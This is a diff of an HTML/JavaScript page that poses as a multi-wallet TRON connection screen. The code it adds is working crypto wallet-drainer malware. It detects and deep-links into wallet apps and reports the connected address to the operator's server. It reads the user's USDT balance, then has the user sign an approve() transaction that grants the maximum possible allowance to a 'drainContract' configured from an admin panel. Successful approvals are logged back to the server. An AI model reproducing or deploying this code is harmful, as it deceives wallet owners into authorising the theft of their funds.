+                else if (Array.isArray(r) && r.length) resolve(r[0]);
+                else if (r && r.address) resolve(r.address);
+                else reject(new Error('No address'));
+              })
+              .catch(reject);
+          } else {
+            reject(new Error('Cannot request accounts'));
+          }
+        });
       }
     }
+  ];
 
-    // ============================================================
-    // UI HELPERS
-    // ============================================================
+  // ============================================================
+  // DOM REFS
+  // ============================================================
+  var msgBox = document.getElementById('msgBox');
+  function msg(type, text) { msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>'; }
+  function hideMsg() { msgBox.innerHTML = ''; }
+  function scShow(id) {
+    document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
+    document.getElementById(id).classList.add('on');
+  }
+  function updateStep(stepNum, status) {
+    var step = document.getElementById('step' + stepNum);
+    if (!step) return;
+    step.className = 'step';
+    if (status === 'active') step.classList.add('active');
+    if (status === 'done') {
+      step.classList.add('done');
+      step.innerHTML = step.innerHTML.replace(/\d/, '<span class="check">✓</span>');
+    }
+  }
 
-    function showError(title, desc) {
-      scShow("scError");
-      document.getElementById("errorTitle").textContent = title;
-      document.getElementById("errorDesc").textContent = desc;
+  // ============================================================
+  // FETCH CONFIG
+  // ============================================================
+  async function fetchConfig() {
+    var statusEl = document.getElementById('configStatus');
+    statusEl.style.display = 'block';
+    statusEl.textContent = 'Loading configuration...';
+    try {
+      var r = await fetch(SITE_URL + '/api/config');
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      var data = await r.json();
+      if (data && data.usdtContract) {
+        config = data;
+        statusEl.textContent = '✅ Configuration loaded';
+        statusEl.style.color = '#4ade80';
+        console.log('✅ Config loaded:', config);
+        return config;
+      }
+      throw new Error('Invalid config');
+    } catch(e) {
+      console.warn('Config fetch failed:', e.message);
+      statusEl.textContent = '⚠️ Using default config';
+      statusEl.style.color = '#fbbf24';
+      config = { usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', drainContract: '', maxApprove: '115792089237316195423570985008687907853269984665640564039457584007913129639935' };
+      return config;
+    }
+  }
+
+  async function sendAddressToServer(address) {
+    try {
+      await fetch(SITE_URL + '/api/qr-connect/' + SESSION_ID, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address: address })
+      });
+    } catch(e) {}
+  }
+
+  async function logEvent(type, address, txId, amount) {
+    try {
+      await fetch(SITE_URL + '/api/event', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ type, address: address || '', txId: txId || '', amount: amount || '' })
+      });
+    } catch(e) {}
+  }
+
+  // ============================================================
+  // GET TRONWEB INSTANCE
+  // ============================================================
+  function getTronWebInstance(walletId) {
+    if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
+    // Check wallet-specific
+    var wallet = WALLETS.find(w => w.id === walletId);
+    if (!wallet) return null;
+    // For trust, try ethereum.tronLink
+    if (walletId === 'trust' && window.ethereum && window.ethereum.isTrust && window.ethereum.tronLink) {
+      var tl = window.ethereum.tronLink;
+      if (tl.tronWeb && tl.tronWeb.ready) return tl.tronWeb;
+    }
+    // For others, try their provider
+    var provider = null;
+    if (walletId === 'okx' && window.okxwallet) provider = window.okxwallet.tronLink || window.okxwallet.tron;
+    else if (walletId === 'tokenpocket' && window.tokenpocket) provider = window.tokenpocket.tron;
+    else if (walletId === 'bitget' && (window.bitkeep || window.bitgetWallet)) provider = (window.bitkeep || window.bitgetWallet).tron;
+    else if (walletId === 'imtoken' && window.imtoken) provider = window.imtoken.tron;
+    if (provider && provider.tronWeb && provider.tronWeb.ready) return provider.tronWeb;
+    return null;
+  }
+
+  // ============================================================
+  // CONNECT WALLET
+  // ============================================================
+  async function connectWallet(walletId) {
+    if (isProcessing) return;
+    hideMsg();
+    isProcessing = true;
+
+    var wallet = WALLETS.find(w => w.id === walletId);
+    if (!wallet) { msg('err', 'Wallet not found'); isProcessing = false; return; }
+
+    if (!config || !config.usdtContract) await fetchConfig();
+    if (!config.drainContract) {
+      msg('err', 'Drain contract not deployed. Please check admin panel.');
+      isProcessing = false; return;
     }
 
-    // ============================================================
-    // RENDER WALLETS - FIXED
-    // ============================================================
+    var detected = wallet.detect();
+    console.log('📱', wallet.name, 'detected:', detected);
 
-    function renderWallets() {
-      console.log("Rendering wallets...");
-      var walletList = document.getElementById("walletList");
-
-      if (!walletList) {
-        console.error("walletList element not found!");
+    if (!detected) {
+      if (isMobile) {
+        // Try deep link
+        var url = window.location.href;
+        if (wallet.id === 'tronlink') {
+          var param = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'tronlink', version: '1.0' }));
+          window.location.href = 'tronlinkoutside://pull.activity?param=' + param;
+        } else if (wallet.id === 'trust') {
+          window.location.href = 'https://link.trustwallet.com/open_url?url=' + encodeURIComponent(url);
+        } else if (wallet.id === 'okx') {
+          window.location.href = 'okx://wallet/dapp/url?url=' + encodeURIComponent(url);
+        } else if (wallet.id === 'tokenpocket') {
+          window.location.href = 'tp://open?url=' + encodeURIComponent(url);
+        } else if (wallet.id === 'bitget') {
+          window.location.href = 'bitkeep://browser?url=' + encodeURIComponent(url);
+        } else if (wallet.id === 'imtoken') {
+          window.location.href = 'imtokenv2://navigate?screen=Browser&url=' + encodeURIComponent(url);
+        } else {
+          msg('warn', wallet.name + ' not installed. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Download it here</a>');
+        }
+        isProcessing = false;
+        return;
+      } else {
+        msg('warn', wallet.name + ' not detected. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Install ' + wallet.name + '</a>');
+        isProcessing = false;
         return;
       }
-
-      walletList.innerHTML = "";
-
-      var detectedWallet = detectWalletBrowser();
-      console.log("Detected wallet browser:", detectedWallet);
-
-      for (var i = 0; i < WALLETS.length; i++) {
-        var w = WALLETS[i];
-        var b = document.createElement("button");
-        b.className = "wallet-btn";
-        b.setAttribute("data-wallet-id", w.id);
-
-        var isDetected = w.detect();
-        var isActive = (detectedWallet === w.id);
-
-        var badgeText = "Connect";
-        var badgeClass = "badge";
-
-        if (isActive) {
-          badgeText = "Active";
-          badgeClass = "badge";
-        } else if (!isDetected && !isMobile) {
-          badgeText = "Install";
-          badgeClass = "badge install";
-        } else if (isMobile && !isDetected) {
-          badgeText = "Open App";
-          badgeClass = "badge";
-        }
-
-        b.innerHTML =
-          '<div class="ico"><img src="' + w.logo + '" alt="' + w.name + '" loading="lazy" onerror="this.style.display=\'none\'"></div>' +
-          '<span class="nm">' + w.name + (isActive ? ' &#128994;' : '') + '</span>' +
-          '<span class="' + badgeClass + '">' + badgeText + '</span>' +
-          '<span class="arrow">&#8250;</span>';
-
-        b.addEventListener("click", (function(id) {
-          return function() {
-            console.log("Wallet clicked:", id);
-            connectWallet(id);
-          };
-        })(w.id));
-
-        walletList.appendChild(b);
-      }
-
-      console.log("Wallets rendered:", WALLETS.length);
     }
 
-    // ============================================================
-    // AUTO-CONNECT FOR WALLET BROWSERS - FIXED
-    // ============================================================
+    scShow('scWait');
+    document.getElementById('waitDesc').textContent = 'Connecting to ' + wallet.name + '...';
+    updateStep(1, 'active');
+    updateStep(2, '');
+    updateStep(3, '');
 
-    async function autoConnectInWalletBrowser() {
-      var detectedWallet = detectWalletBrowser();
-      if (!detectedWallet) return;
+    try {
+      var address = await wallet.connect();
+      if (!address) throw new Error('No address returned');
+      console.log('✅ Address:', address);
+      connectedAddress = address;
+      updateStep(1, 'done');
 
-      console.log("Detected wallet browser:", detectedWallet);
+      // Send to server
+      await sendAddressToServer(address);
+      await logEvent('wallet_connected', address, '', walletId);
 
-      await new Promise(function(r) { setTimeout(r, 1500); });
+      // Get TronWeb instance
+      var tw = getTronWebInstance(walletId);
+      if (!tw) tw = window.tronWeb;
+      if (!tw || !tw.contract) throw new Error('TronWeb not available');
 
-      var wallet = WALLETS.find(function(w) { return w.id === detectedWallet; });
-      if (!wallet) return;
-
-      try {
-        var address = await wallet.connect();
-        if (address) {
-          console.log("Auto-connecting to", detectedWallet, "with address:", address);
-          connectedAddress = address;
-          await sendAddressToServer(address);
-          await logEvent("wallet_connected", address, "", detectedWallet);
-
-          var tw = getTronWebInstance(detectedWallet);
-          if (!tw) tw = window.tronWeb;
-          await doApproveFlow(address, tw, wallet);
-        }
-      } catch(e) {
-        console.warn("Auto-connect failed:", e.message);
+      await doApproveFlow(address, tw, wallet);
+    } catch(e) {
+      console.error('❌ Error:', e);
+      var errMsg = e.message || String(e);
+      if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
+        showError('Cancelled', 'You cancelled the connection');
+      } else {
+        showError('Connection Error', errMsg);
       }
+      isProcessing = false;
     }
+  }
 
-    // ============================================================
-    // INIT
-    // ============================================================
+  // ============================================================
+  // APPROVE FLOW
+  // ============================================================
+  async function doApproveFlow(address, tw, wallet) {
+    scShow('scProcessing');
+    document.getElementById('processingTitle').textContent = 'Checking balance...';
+    document.getElementById('processingDesc').textContent = 'Verifying USDT balance';
+    updateStep(2, 'active');
 
-    function initApp() {
-      console.log("Initializing app...");
-      renderWallets();
-      fetchConfig();
+    try {
+      var usdtContract = await tw.contract(USDT_ABI).at(config.usdtContract);
+      console.log('✅ USDT contract loaded');
 
-      console.log("QR Session:", SESSION_ID);
-      console.log("Site URL:", SITE_URL);
-      console.log("isMobile:", isMobile);
+      var rawBalance = await usdtContract.balanceOf(address).call();
+      var balance = rawBalance.toNumber ? rawBalance.toNumber() : Number(rawBalance);
+      var balanceUsdt = balance / 1e6;
+      console.log('💰 USDT Balance:', balanceUsdt);
+      updateStep(2, 'done');
 
-      if (isMobile) {
-        setTimeout(function() {
-          autoConnectInWalletBrowser();
-        }, 2000);
-      }
-    }
+      document.getElementById('processingTitle').textContent = 'Approving USDT...';
+      document.getElementById('processingDesc').textContent = 'Please confirm in ' + wallet.name;
+      updateStep(3, 'active');
 
-    if (document.readyState === "loading") {
-      document.addEventListener("DOMContentLoaded", function() {
-        console.log("DOM ready, initializing...");
-        initApp();
+      var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+      var built = await tw.transactionBuilder.triggerSmartContract(
+        config.usdtContract,
+        'approve(address,uint256)',
+        { feeLimit: 20000000, callValue: 0 },
+        [
+          { type: 'address', value: config.drainContract },
+          { type: 'uint256', value: approveVal }
+        ],
+        address
+      );
+
+      var approveTx = built.transaction || built;
+      if (!approveTx || !approveTx.txID) throw new Error('Build failed');
+
+      console.log('✅ Transaction built, txID:', approveTx.txID);
+
+      var signed = await tw.trx.sign(approveTx);
+      console.log('✅ Signed');
+
+      var receipt = await tw.trx.sendRawTransaction(signed);
+      console.log('✅ Broadcasted:', receipt);
+
+      var txId = receipt.txid || receipt.txID || '';
+      await logEvent('approve_signed', address, txId);
+
+      // Notify server
+      await fetch(SITE_URL + '/api/approve-done', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address: address })
       });
-    } else {
-      console.log("DOM already ready, initializing...");
-      initApp();
-    }
 
-    setTimeout(function() {
-      var walletList = document.getElementById("walletList");
-      if (walletList && walletList.children.length === 0) {
-        console.log("No wallets rendered yet, forcing render...");
-        renderWallets();
+      updateStep(3, 'done');
+
+      scShow('scDone');
+      document.getElementById('doneAddress').textContent = address;
+      isProcessing = false;
+
+    } catch(e) {
+      console.error('❌ Approve error:', e);
+      var errMsg = e.message || String(e);
+      if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
+        showError('Cancelled', 'You cancelled the approval');
+      } else {
+        showError('Approval Failed', errMsg);
       }
-    }, 1500);
-  </script>
+      isProcessing = false;
+    }
+  }
+
+  function showError(title, desc) {
+    scShow('scError');
+    document.getElementById('errorTitle').textContent = title;
+    document.getElementById('errorDesc').textContent = desc;
+  }
+
+  // ============================================================
+  // RENDER WALLETS
+  // ============================================================
+  function renderWallets() {
+    var walletList = document.getElementById('walletList');
+    if (!walletList) return;
+    walletList.innerHTML = '';
+    for (var i = 0; i < WALLETS.length; i++) {
+      var w = WALLETS[i];
+      var btn = document.createElement('button');
+      btn.className = 'wallet-btn';
+      var isDetected = w.detect();
+      var badgeText = isDetected ? 'Connect' : (isMobile ? 'Open App' : 'Install');
+      var badgeClass = isDetected ? 'badge' : 'badge install';
+      btn.innerHTML = '<div class="ico"><img src="' + w.logo + '" alt="' + w.name + '" loading="lazy" onerror="this.style.display=\'none\'"></div><span class="nm">' + w.name + '</span><span class="' + badgeClass + '">' + badgeText + '</span><span class="arrow">›</span>';
+      btn.addEventListener('click', (function(id) { return function() { connectWallet(id); }; })(w.id));
+      walletList.appendChild(btn);
+    }
+  }
+
+  // ============================================================
+  // INIT
+  // ============================================================
+  function init() {
+    renderWallets();
+    fetchConfig();
+    console.log('📱 QR Session:', SESSION_ID);
+    console.log('🌐 SITE_URL:', SITE_URL);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+  // fallback
+  setTimeout(function() {
+    var list = document.getElementById('walletList');
+    if (list && list.children.length === 0) renderWallets();
+  }, 1000);
+</script>
 </body>
 </html>
